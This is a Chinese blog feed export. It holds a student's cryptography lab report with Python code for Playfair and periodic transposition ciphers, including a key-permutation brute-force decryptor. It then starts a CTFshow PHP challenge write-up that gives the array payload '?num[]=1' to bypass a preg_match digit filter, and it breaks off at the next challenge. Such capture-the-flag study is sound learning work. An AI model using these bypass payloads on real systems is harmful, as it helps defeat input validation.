key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入Key:'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入需要解密的字符：'</span><span class="token punctuation">)</span>    decode<span class="token punctuation">(</span>s<span class="token punctuation">,</span>key<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入错误！'</span><span class="token punctuation">)</span><span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请勿输入空格！'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、心得体会：</p><p>怎么说呢，我的同学们都在用C，就我在拿python写这东西，这都是很经典的密码术，前人的智慧，在这次写脚本解决的时候，都可以用暴力解决。</p><p>虽然有点可惜，因为使用的python编程，我的本意是简单，其实这些程序的内容在我说了解的一个密码学库里有相应的内置函数，还是写了下,还是有些在意的问题，比如说我本身打算使用库函数技术函数的逆的，但是在实践中发现我记忆中用来求逆的函数无法处理非方阵的逆…….总之需要学的好多啊</p><h2 id="实验3-周期置换密码与Playfair密码"><a href="#实验3-周期置换密码与Playfair密码" class="headerlink" title="实验3 周期置换密码与Playfair密码"></a>实验3 周期置换密码与Playfair密码</h2><p>1、 实验目的</p><p>（1）了解周期置换密码的基本设计原理；</p><p>（2）掌握基本的加密解密操作；</p><p>2、实验时间：2学时</p><p>3、实验内容：</p><p>（1）任选语言，实现课本例2-5。</p><p>（2）任选语言，实现课本例2-7。</p><p>4、实验过程及结果：</p><p>（1）例2-5Playfair密码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Playfair密码</span>letter_list <span class="token operator">=</span> <span class="token string">'ABCDEFGHIKLMNOPQRSTUVWXYZ'</span><span class="token comment"># 移除字符串中重复的字母</span><span class="token keyword">def</span> <span class="token function">remove_duplicates</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> key<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 转成大写字母组成的字符串</span>    _key <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> key<span class="token punctuation">:</span>        <span class="token keyword">if</span> ch <span class="token operator">==</span> <span class="token string">'J'</span><span class="token punctuation">:</span>            ch <span class="token operator">=</span> <span class="token string">'I'</span>        <span class="token keyword">if</span> ch <span class="token keyword">in</span> _key<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            _key <span class="token operator">+=</span> ch    <span class="token keyword">return</span> _key<span class="token comment"># 根据密钥建立密码表</span><span class="token keyword">def</span> <span class="token function">create_matrix</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> remove_duplicates<span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token comment"># 移除密钥中的重复字母</span>    key <span class="token operator">=</span> key<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>  <span class="token comment"># 去除密钥中的空格</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> letter_list<span class="token punctuation">:</span>  <span class="token comment"># 根据密钥获取新组合的字母表</span>        <span class="token keyword">if</span> ch <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            key <span class="token operator">+=</span> ch    <span class="token comment"># 密码表</span>    keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 将新的字母表里的字母逐个填入密码表中，组成5*5的矩阵</span>        keys<span class="token punctuation">[</span>i <span class="token operator">//</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token comment"># j用来定位字母表的行</span>    <span class="token keyword">return</span> keys<span class="token comment"># 获取字符在密码表中的位置</span><span class="token keyword">def</span> <span class="token function">get_matrix_index</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span> keys<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> ch <span class="token operator">==</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> i<span class="token punctuation">,</span> j  <span class="token comment"># i为行，j为列</span><span class="token keyword">def</span> <span class="token function">get_ctext</span><span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> ch2<span class="token punctuation">,</span> keys<span class="token punctuation">)</span><span class="token punctuation">:</span>    index1 <span class="token operator">=</span> get_matrix_index<span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> keys<span class="token punctuation">)</span>    index2 <span class="token operator">=</span> get_matrix_index<span class="token punctuation">(</span>ch2<span class="token punctuation">,</span> keys<span class="token punctuation">)</span>    r1<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> c2 <span class="token operator">=</span> index1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> r1 <span class="token operator">==</span> r2<span class="token punctuation">:</span>        ch1 <span class="token operator">=</span> keys<span class="token punctuation">[</span>r1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>c1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span>        ch2 <span class="token operator">=</span> keys<span class="token punctuation">[</span>r2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>c2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span>    <span class="token keyword">elif</span> c1 <span class="token operator">==</span> c2<span class="token punctuation">:</span>        ch1 <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token punctuation">(</span>r1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c1<span class="token punctuation">]</span>        ch2 <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token punctuation">(</span>r2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c2<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        ch1 <span class="token operator">=</span> keys<span class="token punctuation">[</span>r1<span class="token punctuation">]</span><span class="token punctuation">[</span>c2<span class="token punctuation">]</span>        ch2 <span class="token operator">=</span> keys<span class="token punctuation">[</span>r2<span class="token punctuation">]</span><span class="token punctuation">[</span>c1<span class="token punctuation">]</span>    text <span class="token operator">=</span> <span class="token string">''</span>    text <span class="token operator">+=</span> ch1    text <span class="token operator">+=</span> ch2    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">get_ptext</span><span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> ch2<span class="token punctuation">,</span> keys<span class="token punctuation">)</span><span class="token punctuation">:</span>    index1 <span class="token operator">=</span> get_matrix_index<span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> keys<span class="token punctuation">)</span>    index2 <span class="token operator">=</span> get_matrix_index<span class="token punctuation">(</span>ch2<span class="token punctuation">,</span> keys<span class="token punctuation">)</span>    r1<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> c2 <span class="token operator">=</span> index1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> r1 <span class="token operator">==</span> r2<span class="token punctuation">:</span>        ch1 <span class="token operator">=</span> keys<span class="token punctuation">[</span>r1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>c1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span>        ch2 <span class="token operator">=</span> keys<span class="token punctuation">[</span>r2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>c2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span>    <span class="token keyword">elif</span> c1 <span class="token operator">==</span> c2<span class="token punctuation">:</span>        ch1 <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token punctuation">(</span>r1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c1<span class="token punctuation">]</span>        ch2 <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token punctuation">(</span>r2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c2<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        ch1 <span class="token operator">=</span> keys<span class="token punctuation">[</span>r1<span class="token punctuation">]</span><span class="token punctuation">[</span>c2<span class="token punctuation">]</span>        ch2 <span class="token operator">=</span> keys<span class="token punctuation">[</span>r2<span class="token punctuation">]</span><span class="token punctuation">[</span>c1<span class="token punctuation">]</span>    text <span class="token operator">=</span> <span class="token string">''</span>    text <span class="token operator">+=</span> ch1    text <span class="token operator">+=</span> ch2    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">playfair_encode</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    plaintext <span class="token operator">=</span> plaintext<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    plaintext <span class="token operator">=</span> plaintext<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    plaintext <span class="token operator">=</span> plaintext<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"I"</span><span class="token punctuation">)</span>    plaintext <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>    plaintext<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>    plaintext<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>    keys <span class="token operator">=</span> create_matrix<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    ciphertext <span class="token operator">=</span> <span class="token string">''</span>    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'#'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> plaintext<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            plaintext<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> plaintext<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'#'</span><span class="token punctuation">:</span>            plaintext<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'X'</span>        ciphertext <span class="token operator">+=</span> get_ctext<span class="token punctuation">(</span>plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> plaintext<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keys<span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">2</span>    <span class="token keyword">return</span> ciphertext<span class="token keyword">def</span> <span class="token function">playfair_decode</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    keys <span class="token operator">=</span> create_matrix<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token number">0</span>    plaintext <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>        plaintext <span class="token operator">+=</span> get_ptext<span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ciphertext<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keys<span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">2</span>    _plaintext <span class="token operator">=</span> <span class="token string">''</span>    _plaintext <span class="token operator">+=</span> plaintext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'X'</span><span class="token punctuation">:</span>            _plaintext <span class="token operator">+=</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">elif</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'X'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> plaintext<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> plaintext<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                _plaintext <span class="token operator">+=</span> plaintext<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    _plaintext <span class="token operator">+=</span> plaintext<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    _plaintext <span class="token operator">=</span> _plaintext<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> _plaintextplaintext <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'明文：'</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'密钥：'</span><span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> playfair_encode<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'加密后的密文：'</span> <span class="token operator">+</span> ciphertext<span class="token punctuation">)</span>plaintext <span class="token operator">=</span> playfair_decode<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'解密后的明文：'</span> <span class="token operator">+</span> plaintext<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）例2-7周期置换密码：</p><p>正常加密：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npmiwen <span class="token operator">=</span> <span class="token string">""</span>miyao<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入秘钥顺序: '</span><span class="token punctuation">)</span>l1<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>miyao<span class="token punctuation">)</span>mingwen<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入明文: '</span><span class="token punctuation">)</span>l2<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l2<span class="token operator">//</span>l1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> miyao<span class="token punctuation">:</span>      miwen<span class="token operator">=</span>miwen<span class="token operator">+</span>mingwen<span class="token punctuation">[</span><span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>miwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆破解密：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npmingwen <span class="token operator">=</span> <span class="token string">""</span>MY<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入猜测的秘钥长度: '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>miwen<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入秘文: '</span><span class="token punctuation">)</span>l2<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>miwen<span class="token punctuation">)</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./秘钥排列.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>lst<span class="token operator">=</span><span class="token builtin">range</span><span class="token punctuation">(</span>MY<span class="token punctuation">)</span><span class="token builtin">list</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> lst<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">permutations</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> position <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>    l<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"&#123;&#125;\n"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>position<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token builtin">list</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span>      permutations<span class="token punctuation">(</span>position<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token builtin">list</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span>permutations<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./秘钥排列.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>  mingwen <span class="token operator">=</span> <span class="token string">""</span>  miyao <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>  miyao<span class="token operator">=</span>miyao<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l2 <span class="token operator">//</span> MY <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> miyao<span class="token punctuation">:</span>      mingwen <span class="token operator">=</span> mingwen <span class="token operator">+</span> miwen<span class="token punctuation">[</span><span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token keyword">not</span> miyao<span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、心得体会：</p><p>这周的两个题目难度都很大，Playfair密码的实验写了老久，在这里没有调用太多库函数，而周期性替换密码，这个正常的加密与解密都很正常。但是使用唯秘文攻击进行爆破，在猜测的秘钥长度下进行爆破，得到明文。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之web入门---PHP特性上</title>
      <link href="/2022/03/17/CTFshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98%20php%E7%89%B9%E6%80%A7/"/>
      <url>/2022/03/17/CTFshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98%20php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="CTFshow-Web题目入门之PHP特性上"><a href="#CTFshow-Web题目入门之PHP特性上" class="headerlink" title="CTFshow  Web题目入门之PHP特性上"></a>CTFshow  Web题目入门之PHP特性上</h2><p>[TOC]</p><h3 id="Web89"><a href="#Web89" class="headerlink" title="Web89"></a>Web89</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里考察的是 <code>preg_match — 执行匹配正则表达式</code> 这个表达式的匹配。我们可以参考官方文档</p><blockquote><p>**preg_match()<strong>返回 <code>pattern</code> 的匹配次数。 它的值将是0次（不匹配）或1次，因为</strong>preg_match()**在第一次匹配后 将会停止搜索。 </p></blockquote><p>由于参与匹配的是字符串内容，我们可以构造非字符串也就是数组内容?num[]=1;</p><h3 id="Web90"><a href="#Web90" 